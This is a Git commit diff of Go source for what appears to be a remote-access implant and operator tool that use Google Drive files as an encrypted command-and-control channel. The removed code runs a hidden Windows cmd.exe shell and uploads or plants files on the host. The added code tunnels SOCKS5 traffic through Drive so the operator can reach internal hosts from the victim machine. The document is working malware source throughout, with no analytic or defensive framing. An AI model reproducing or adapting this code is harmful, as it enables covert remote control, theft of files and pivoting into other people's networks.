3e062ca42c58a917cb6ca6f1f41d591de872763e
bluecode98 <bluecode98@gmail.com>
2018-07-09 22:37:00 +0530

    proxy

--- gserver.go
+++ gserver.go
@@ -11,17 +11,9 @@ import (
 	"google.golang.org/api/drive/v3"
 	"io/ioutil"
 	"bytes"
-	"os/exec"
 	"./toolkits"
 	"github.com/op/go-logging"
 	"os"
-	"syscall"
-	//"strings"
-	"path/filepath"
-	"strings"
-	"path"
-	"io"
-	"golang.org/x/sys/windows"
 )
 
 var ver = "080704"
@@ -57,302 +49,86 @@ func getClientId() string {
 	return hex.EncodeToString(cipherStr)
 }
 
-func initLive(srv *drive.Service, serverId string) error  {
-	indexName := serverId + ".idx"
-	queryString := fmt.Sprintf("name='%s'", indexName)
-	r, err := srv.Files.List().Q(queryString).
-		Fields("files(id)").Do()
-	if err != nil {
-		log.Error("Unable to retrieve files", err)
-		return err
-	}
-
-	for _, i := range r.Files {
-		// delete file
-		srv.Files.Delete(i.Id).Do()
-	}
-
-	return nil
-}
-
-func liveReport(srv *drive.Service, serverId string) error  {
-	indexName := serverId + ".idx"
-	queryString := fmt.Sprintf("name='%s'", indexName)
-	r, err := srv.Files.List().Q(queryString).
-		Fields("files(id, name, size)").Do()
-	if err != nil {
-		log.Error("Unable to retrieve files", err)
-		return err
-	}
-
-	disp := fmt.Sprintf("%s(%s)", time.Now().Format("2006-01-02 15:04:05"), ver)
-	if len(r.Files) == 0 {
-		newFile := &drive.File{
-			Name: indexName,
-			MimeType: "application/octet-stream",
-			Description: disp,
-		}
-		nf, _ := srv.Files.Create(newFile).Do()
-		log.Debug("create", nf.Id)
-	} else {
-		for _, i := range r.Files {
-			// clear file and update file time
-			newFile := &drive.File{
-				Description: disp,
-			}
-			nf, err := srv.Files.Update(i.Id, newFile).Do()
-			if err != nil {
-				log.Debug("update files error:", err)
-			} else {
-				log.Debug("update", nf.Id)
-			}
-		}
-	}
-
-	return nil
-}
-
-func socketRecv(srv *drive.Service, fileId string, src io.Reader)  {
-	// 循环等待命令数据
-	for {
-		log.Debug("begin read")
-		buf := make([]byte, 10240)
-		n, err := src.Read(buf)
-		if err != nil {
-			log.Debug("read error")
-			break
-		}
-		log.Debug("read", n, "byte(s)")
-		if n == 0 {
-			break
-		}
-		tempMedia := bytes.NewBuffer(nil)
-		tempMedia.Write(buf[:n])
-		sendData := toolkits.AesEncrypt(tempMedia.Bytes(), toolkits.MessageKey)
-		sendMedia := bytes.NewBuffer(sendData)
-
-		// 等待上一次数据被清除
-		for {
-			media, err := srv.Files.Get(fileId).Fields("size").Do()
-			if err != nil {
-				//println(err.Error())
-				return
-			}
-			if media.Size == 0 {
-				break
-			}
-			time.Sleep(time.Duration(1) * time.Second)
-		}
-
-		// 提交新数据
-		srv.Files.Update(fileId, nil).Media(sendMedia).Do()
-	}
-
-}
-
-func socksCreate(srv *drive.Service, fileId string)  {
-	var target net.Conn
-	var socketName string
+func socksCreate(srv *drive.Service, serverId string, fileId string)  {
+	//var target net.Conn
 	var outputId string
-	//closeCh := make(chan int)
+	closeCh := make(chan int)
 
-	// 循环等待命令数据
-	for {
-		timeout := time.NewTicker(time.Second)
-		select {
-		case <- timeout.C:
-			//log.Debug("timeout")
-		//case <- closeCh:
-		//	log.Debug("abort")
-		//	return
-		}
-		// 等待数据
-		media, err:= srv.Files.Get(fileId).Fields("size, name, appProperties").Do()
-		if err != nil {
-			//println(err.Error())
-			return
-		}
-		if media.Size == 0 {
-			//time.Sleep(time.Duration(1)*time.Second)
-			continue
-		}
-		log.Debug("size", media.Size)
-
-		// 读取数据
-		response, err := srv.Files.Get(fileId).Download()
-		if err != nil {
-			log.Error("Download error:", err)
-			return
-		}
-		content, _ := ioutil.ReadAll(response.Body)
-		response.Body.Close()
-		recvData := toolkits.AesDecrypt(content, key)
-		if media.AppProperties["typ"] == "s01" {
-			// 连接目标
-			//log.Debug("connect to", string(recvData))
-			//target, err = net.Dial("tcp", string(recvData))
-			tcpAddr, _ := net.ResolveTCPAddr("tcp4", string(recvData))
-			target, err = net.DialTCP("tcp", nil, tcpAddr)
-			if err != nil {
-				srv.Files.Delete(fileId).Do()
-				return
-			}
-
-			// 解析名称
-			filenameWithSuffix := path.Base(filepath.Base(media.Name))
-			filenameSuffix := path.Ext(filenameWithSuffix)
-			socketName = strings.TrimSuffix(filenameWithSuffix, filenameSuffix)
-
-			// 创建一个保存接收数据的文件
-			localAddr := target.LocalAddr().String()
-			log.Debug("local bind", localAddr)
-			newFile := &drive.File{
-				Name: socketName + ".output",
-				MimeType: "application/octet-stream",
-				AppProperties: map[string]string{
-					"typ":	"s00",
-				},
-			}
-
-			// create output pipe
-			nf, _ := srv.Files.Create(newFile).Do()
-			outputId = nf.Id
-			log.Debug("create output", outputId)
-
-			// 启动数据接收线程
-			go func() {
-				// 读取管道
-				socketRecv(srv, outputId, target)
-				log.Debug("close socket")
-				target.Close()
-				//closeCh <- 1
-
-				// 删除文件
-				log.Debug("delete", outputId)
-				err := srv.Files.Delete(outputId).Do()
-				if err != nil {
-					log.Debug("delete", outputId, err)
-				}
-				log.Debug("delete", fileId)
-				err = srv.Files.Delete(fileId).Do()
-				if err != nil {
-					log.Debug("delete", fileId, err)
-				}
-			}()
-
-			//defer target.Close()
-
-		} else {
-			// 将数据发送到socket
-			log.Debug("send data")
-			n, err := target.Write(recvData)
-			if err != nil {
-				log.Debug("send error", err.Error())
-			} else {
-				log.Debug("send", n, "byte(s)")
-			}
-		}
-
-		// 更新发送数据文件
-		newFile := &drive.File{
-			Name: socketName + ".input",
-			MimeType: "application/octet-stream",
-			Description: outputId,		// 把回应的ID放到这个字段
-			AppProperties: map[string]string{
-				"typ":	outputId,
-			},
-		}
-		messageMedia := bytes.NewBuffer(nil)
-		srv.Files.Update(fileId, newFile).Media(messageMedia).Do()
-	}
-}
-
-func socksMain(srv *drive.Service, serverId string) error  {
-	//log.Debug("query proxy request")
-	indexName := serverId + ".socket"
-	queryString := fmt.Sprintf("name='%s'", indexName)
-	r, err := srv.Files.List().Q(queryString).
-		Fields("files(id, name, size)").Do()
+	// 读取目标地址
+	response, err := srv.Files.Get(fileId).Download()
 	if err != nil {
-		log.Error("Unable to retrieve files", err)
-		return err
+		log.Error("download error:", err)
+		return
 	}
+	content, _ := ioutil.ReadAll(response.Body)
+	response.Body.Close()
+	recvData := toolkits.AesDecrypt(content, key)
 
-	for _, i := range r.Files {
-		log.Debug("proxy on", i.Id)
-		go socksCreate(srv, i.Id)
-		//socksCreate(srv, i.Id)
-	}
-
-	return nil
-}
-
-func getFile(filename string) ([]byte, error) {
-	file, err := os.Open(filename)
+	tcpAddr, _ := net.ResolveTCPAddr("tcp4", string(recvData))
+	target, err := net.DialTCP("tcp", nil, tcpAddr)
 	if err != nil {
-		return nil, err
+		log.Error("connect error", err.Error())
+		srv.Files.Delete(fileId).Do()
+		return
 	}
-	defer file.Close()
+	defer target.Close()
 
-	fileData, err := ioutil.ReadAll(file)
-	if err != nil {
-		return nil, err
+	// 创建输出数据文件
+	newFile := &drive.File{
+		Name: serverId + ".output",
+		MimeType: "application/octet-stream",
+		AppProperties: map[string]string{
+			"typ":	"data",
+		},
 	}
+	nf, _ := srv.Files.Create(newFile).Do()
+	outputId = nf.Id
 
-	return fileData, err
-}
-
-func execMessage(srv *drive.Service, inputId string, outputId string) error {
-	//log.Debug("exec message", inputId)
-	cmdShell := exec.Command("cmd.exe")
-	cmdShell.SysProcAttr = &syscall.SysProcAttr{
-		HideWindow: true,
-		CreationFlags: windows.STARTF_USESTDHANDLES,
+	// 更新输入数据文件
+	newFile = &drive.File{
+		Name: serverId + ".input",
+		MimeType: "application/octet-stream",
+		Description: outputId,		// 把回应的ID放到这个字段
+		AppProperties: map[string]string{
+			"typ":	"data",
+		},
 	}
-
-	ppReader, err := cmdShell.StdoutPipe()
-	defer ppReader.Close()
-	if err != nil {
-		log.Debug("create read pipe error", err.Error())
-	}
-
-	ppWriter, err := cmdShell.StdinPipe()
-	defer ppWriter.Close()
-	if err != nil {
-		log.Debug("create write pipe error", err.Error())
-	}
-
-	if err := cmdShell.Start(); err != nil {
-		return err
-	}
+	messageMedia := bytes.NewBuffer(nil)
+	srv.Files.Update(fileId, newFile).Media(messageMedia).Do()
 
 	// pipeReader
 	go func() {
 		buffer := make([]byte, 10240)
 
 		for {
-			// 从管道读取数据
-			n, err := ppReader.Read(buffer)
+			// 从socket读取数据
+			n, err := target.Read(buffer)
 			if err != nil {
-				if err == io.EOF {
-					log.Debug("pipi has closed")
-					break
-				} else {
-					log.Debug("read content failed")
-				}
+				log.Debug("read error")
+				closeCh <- 1
+				break
+			}
+			log.Debug("read", n, "byte(s)")
+			if n == 0 {
+				closeCh <- 1
+				break
 			}
 
 			// 加密数据
-			sendData := toolkits.AesEncrypt(buffer[:n], toolkits.MessageKey)
-			messageMedia := bytes.NewBuffer(sendData)
+			tempMedia := bytes.NewBuffer(nil)
+			tempMedia.Write(buffer[:n])
+			sendData := toolkits.AesEncrypt(tempMedia.Bytes(), toolkits.MessageKey)
+			sendMedia := bytes.NewBuffer(sendData)
 
 			// 等待文件清空
 			for  {
 				timeout := time.NewTicker(time.Second)
 				select {
-				case <-timeout.C:
-					//case <- abortCh:
-					//	return
+				case <- timeout.C:
+					//log.Debug("timeout")
+				case <- closeCh:
+					log.Debug("reader get close channel")
+					return
 				}
 
 				media, err := srv.Files.Get(outputId).Fields("id, size").Do()
@@ -367,30 +143,34 @@ func execMessage(srv *drive.Service, inputId string, outputId string) error {
 			}
 
 			// 更新数据文件
-			//log.Debug("write to pipe")
-			srv.Files.Update(outputId, nil).Media(messageMedia).Do()
+			srv.Files.Update(outputId, nil).Media(sendMedia).Do()
 		}
 
+		log.Debug("pipe reader end")
 	}()
 
 	// pipeWriter
 	go func() {
-		for {
-			var media *drive.File
-			var err error
+		var media *drive.File
+		var err error
 
+		inputId := fileId
+		for {
 			// 等待数据文件
 			for  {
 				timeout := time.NewTicker(time.Second)
 				select {
-				case <-timeout.C:
-					//case <- abortCh:
-					//	return
+				case <- timeout.C:
+					//log.Debug("timeout")
+				case <- closeCh:
+					log.Debug("writer get close channel")
+					return
 				}
 
 				media, err = srv.Files.Get(inputId).Fields("id, size, appProperties").Do()
 				if err != nil {
 					log.Debug("get error")
+					closeCh <- 1
 					return
 				}
 				//log.Debug("check input", media.Id, media.Size, media.AppProperties["typ"])
@@ -409,120 +189,33 @@ func execMessage(srv *drive.Service, inputId string, outputId string) error {
 			response.Body.Close()
 			recvData := toolkits.AesDecrypt(content, toolkits.MessageKey)
 
-			if media.AppProperties["typ"] == "put" {
-				// put文件
-				OriginalFilename := media.AppProperties["file"]
-				file, err := os.OpenFile(OriginalFilename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0666)
-				responseMessage := "put " + OriginalFilename
-				if err != nil {
-					responseMessage = err.Error()
-				} else {
-					file.Write(recvData)
-					file.Close()
-					responseMessage += " ok"
-				}
-
-				// 加密数据
-				sendData := toolkits.AesEncrypt([]byte(responseMessage), toolkits.MessageKey)
-				messageMedia := bytes.NewBuffer(sendData)
-
-				// 回复信息
-				srv.Files.Update(outputId, nil).Media(messageMedia).Do()
-			} else if media.AppProperties["typ"] == "get" {
-				// get文件
-				OriginalFilename := media.AppProperties["file"]
-
-				// 加密数据
-				fileData, err := getFile(OriginalFilename)
-				if err != nil {
-					sendData := toolkits.AesEncrypt([]byte(err.Error()), toolkits.MessageKey)
-					messageMedia := bytes.NewBuffer(sendData)
-
-					// 回复信息
-					srv.Files.Update(outputId, nil).Media(messageMedia).Do()
-				} else {
-					sendData := toolkits.AesEncrypt(fileData, toolkits.MessageKey)
-					messageMedia := bytes.NewBuffer(sendData)
-
-					// 提交文件
-					newFile := &drive.File{
-						AppProperties: map[string]string{
-							"typ":	"get",
-							"file":	OriginalFilename,
-						},
-					}
-					srv.Files.Update(outputId, newFile).Media(messageMedia).Do()
-				}
+			// 将数据写入socket
+			n, err := target.Write(recvData)
+			if err != nil {
+				log.Debug("send error", err.Error())
+				closeCh <- 1
+				return
 			} else {
-				// 写入管道
-				ppWriter.Write(recvData)
+				log.Debug("send", n, "byte(s)")
 			}
 
 			// 清空数据文件
-			newFile := &drive.File{
-				AppProperties: map[string]string{
-					"typ":	"sh",
-				},
-			}
 			messageMedia := bytes.NewBuffer(nil)
-			srv.Files.Update(inputId, newFile).Media(messageMedia).Do()
+			srv.Files.Update(inputId, nil).Media(messageMedia).Do()
 		}
 	}()
 
-	time.Sleep(time.Duration(6)*time.Hour)
-	return err
-}
-
-func messageMain(srv *drive.Service, serverId string) error  {
-	//log.Debug("query message request")
-	queryString := fmt.Sprintf("name='%s.smd'", serverId)
-	r, err := srv.Files.List().Q(queryString).
-		Fields("files(id, name, originalFilename, appProperties)").Do()
-	if err != nil {
-		log.Error("Unable to retrieve files", err)
-		return err
-	}
-
-	for _, i := range r.Files {
-		fileId		:= i.Id
-		cmdType 	:= i.AppProperties["typ"]
-
-		//log.Debug("file id", fileId)
-		//log.Debug("file name", i.Name)
-
-		// create output file
-		newFile := &drive.File{
-			Name: serverId + ".odd",
-			MimeType: "application/octet-stream",
-		}
-		nf, err := srv.Files.Create(newFile).Do()
-		if err != nil {
-			log.Debug("create error")
-			srv.Files.Delete(fileId).Do()
-			continue
-		}
-		outputId := nf.Id
-
-		// change input file
-		newFile = &drive.File{
-			Name: serverId + ".idd",
-			MimeType: "application/octet-stream",
-			Description: outputId,		// 把回应的ID放到这个字段
-		}
-		messageMedia := bytes.NewBuffer(nil)
-		srv.Files.Update(fileId, newFile).Media(messageMedia).Do()
-
-		if cmdType == "sh" {
-			go execMessage(srv, fileId, outputId)
-		}
-	}
-
-	return nil
+	// Wait
+	<- closeCh
+	log.Debug("proxy close")
+	srv.Files.Delete(fileId).Do()
+	srv.Files.Delete(outputId).Do()
 }
 
 func main() {
 	// 获取主机ID
-	serverId := "201cc0a4e7b594ccd147ff2e6cad9cdf"
+	//serverId := "201cc0a4e7b594ccd147ff2e6cad9cdf"
+	serverId := getClientId()
 
 	// init log config
 	backend2 := logging.NewLogBackend(os.Stderr, "", 0)
@@ -559,9 +252,8 @@ func main() {
 			}
 
 			for _, i := range r.Files {
-				log.Debug("proxy on", i.Id)
-				//go socksCreate(srv, i.Id)
-				socksCreate(srv, i.Id)
+				go socksCreate(srv, serverId, i.Id)
+				//socksCreate(srv, i.Id)
 			}
 			time.Sleep(time.Duration(3)*time.Second)
 		}
---
+++ tproxy.go
@@ -0,0 +1,266 @@
+package main
+
+import (
+	"net"
+	"strconv"
+	"io"
+	"github.com/op/go-logging"
+	"os"
+	"google.golang.org/api/drive/v3"
+	"./climanage"
+	"./toolkits"
+	"fmt"
+	"bytes"
+	"time"
+	"io/ioutil"
+	"flag"
+)
+
+var log = logging.MustGetLogger("goserver")
+var format = logging.MustStringFormatter(
+	//`%{time:15:04:05.000} %{shortfunc} > %{level:s} %{message}`,
+	`%{time:15:04:05.000} > %{level:s} %{message}`,
+)
+
+func main() {
+	// get param
+	cId := flag.String("id", "", "server id")
+	cFile := flag.String("c", "", "config file name")
+	flag.Parse()
+
+	if (*cId == "") || (*cFile == "") {
+		flag.PrintDefaults()
+		os.Exit(0)
+	}
+
+	// init log config
+	backend2 := logging.NewLogBackend(os.Stderr, "", 0)
+	backend2Formatter := logging.NewBackendFormatter(backend2, format)
+	logging.SetBackend(backend2Formatter)
+
+	// 登录Google
+	serverId := *cId
+	configFile := *cFile
+	log.Debug("login from", configFile)
+	srv, err := climanage.LoginDriveFromFile(configFile)
+	if err != nil{
+		panic(err)
+	}
+	log.Info("login OK")
+	log.Debug("server id:", serverId)
+
+	l, err := net.Listen("tcp", ":1085")
+	if err != nil {
+		log.Panic(err)
+	}
+
+	for {
+		client, err := l.Accept()
+		if err != nil {
+			log.Panic(err)
+		}
+
+		go handleClientRequest(srv, serverId, client)
+	}
+}
+
+func handleClientRequest(srv *drive.Service, serverId string, client net.Conn) {
+	if client == nil {
+		return
+	}
+	defer client.Close()
+
+	var b [1024]byte
+	n, err := client.Read(b[:])
+	if err != nil {
+		log.Debug(err)
+		return
+	}
+
+	// 只处理Socks5协议
+	// 客户端回应：Socks服务端不需要验证方式
+	if b[0] == 0x05 {
+		client.Write([]byte{0x05, 0x00})
+		n, err = client.Read(b[:])
+		var host, port string
+
+		//switch b[3] {
+		//case 0x01: //IP V4
+		//	host = net.IPv4(b[4], b[5], b[6], b[7]).String()
+		//case 0x03: //域名
+		//	host = string(b[5 : n-2]) //b[4]表示域名的长度
+		//case 0x04: //IP V6
+		//	host = net.IP{b[4], b[5], b[6], b[7], b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15], b[16], b[17], b[18], b[19]}.String()
+		//}
+
+		//if (b[3] == 0x01) && (b[4] == 172) {
+		if b[3] == 0x01 {
+			host = net.IPv4(b[4], b[5], b[6], b[7]).String()
+		} else {
+			log.Debug("not allowed IP")
+			client.Write([]byte{0x05, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
+			return
+		}
+		port = strconv.Itoa(int(b[n-2])<<8 | int(b[n-1]))
+
+		remoteAddr := fmt.Sprintf("%s:%s", host, port)
+		log.Debug("proxy", remoteAddr)
+
+		// 提交请求到远程
+		newFile := &drive.File{
+			Name: serverId + ".socket",
+			MimeType: "application/octet-stream",
+			AppProperties: map[string]string{
+				"typ":	"proxy",
+			},
+		}
+
+		// 加密数据
+		sendData := toolkits.AesEncrypt([]byte(remoteAddr), toolkits.MessageKey)
+		messageMedia := bytes.NewBuffer(sendData)
+
+		// 创建请求文件
+		nf, err := srv.Files.Create(newFile).Media(messageMedia).Do()
+		if err != nil {
+			log.Debug("create proxy file error", err.Error())
+			client.Write([]byte{0x05, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
+			return
+		}
+
+		// 文件ID
+		inputId := nf.Id
+		outputId := ""
+
+		// wait for response
+		for {
+			timeout := time.NewTicker(time.Second)
+			select {
+			case <-timeout.C:
+				//case <- abortCh:
+				//	return
+			}
+
+			media, err := srv.Files.Get(inputId).Fields("id, size, description").Do()
+			if err != nil {
+				log.Debug("get error")
+				return
+			}
+			//log.Debug("check response")
+			if media.Size == 0 {
+				outputId = media.Description
+				break
+			}
+		}
+		log.Debug("connect", inputId, outputId)
+
+		// 响应客户端连接成功
+		client.Write([]byte{0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
+
+		// 进行数据转发
+		closeCh := make(chan error)
+		//abortCh := make(chan int)
+		go GetOutputData(srv, outputId, client, closeCh)
+		go GetInputData(srv, inputId, client, closeCh)
+
+		// Wait
+		<- closeCh
+		log.Debug("proxy close")
+		srv.Files.Delete(inputId).Do()
+		srv.Files.Delete(outputId).Do()
+		//abortCh <- -1
+	}
+}
+
+func GetInputData(srv *drive.Service, fileId string, src io.Reader, errCh chan error) {
+	// 循环等待命令数据
+	buf := make([]byte, 10240)
+	for {
+		// 等待数据
+		//log.Debug("begin read")
+		n, err := src.Read(buf)
+		if err != nil {
+			errCh <- err
+			errCh <- err
+			//log.Debug("client close")
+			break
+		}
+		//log.Debug("read", n, "byte(s)")
+		if n == 0 {
+			errCh <- err
+			errCh <- err
+			//log.Debug("client close")
+			break
+		}
+		tempMedia := bytes.NewBuffer(nil)
+		tempMedia.Write(buf[:n])
+		sendData := toolkits.AesEncrypt(tempMedia.Bytes(), toolkits.MessageKey)
+		sendMedia := bytes.NewBuffer(sendData)
+
+		// 等待上一次数据被处理
+		for {
+			media, err := srv.Files.Get(fileId).Fields("size, name, appProperties").Do()
+			if err != nil {
+				errCh <- err
+				return
+			}
+			if media.Size == 0 {
+				// 提交数据
+				newFile := &drive.File{
+					AppProperties: map[string]string{
+						"typ":	"data",
+					},
+				}
+				srv.Files.Update(fileId, newFile).Media(sendMedia).Do()
+				log.Debug("send", n, "byte(s)")
+				break
+			}
+			time.Sleep(time.Duration(1) * time.Second)
+		}
+	}
+}
+
+func GetOutputData(srv *drive.Service, fileId string, dst io.Writer, abortCh chan error) {
+	// 循环等待命令数据
+	for {
+		//log.Debug("select")
+		timeout := time.NewTicker(time.Second)
+		select {
+		case <-timeout.C:
+			//log.Debug("timeout")
+		case <- abortCh:
+			//log.Debug("abort")
+			return
+		}
+		// 等待数据
+		//log.Debug("get file")
+		media, err:= srv.Files.Get(fileId).Fields("size, name, appProperties").Do()
+		if err != nil {
+			log.Debug("get error", err.Error())
+			//errCh <- err
+			break
+		}
+		if media.Size == 0 {
+			//time.Sleep(time.Duration(1)*time.Second)
+			continue
+		}
+
+		// read data from gdrive
+		log.Debug("recv", media.Size, "byte(s)")
+		response, err := srv.Files.Get(fileId).Download()
+		if err != nil {
+			log.Debug("Download error:", err)
+			break
+		}
+		content, _ := ioutil.ReadAll(response.Body)
+		response.Body.Close()
+		recvData := toolkits.AesDecrypt(content, toolkits.MessageKey)
+
+		// send to client
+		dst.Write(recvData)
+
+		// clear data
+		messageMedia := bytes.NewBuffer(nil)
+		srv.Files.Update(fileId, nil).Media(messageMedia).Do()
+	}
+
+}
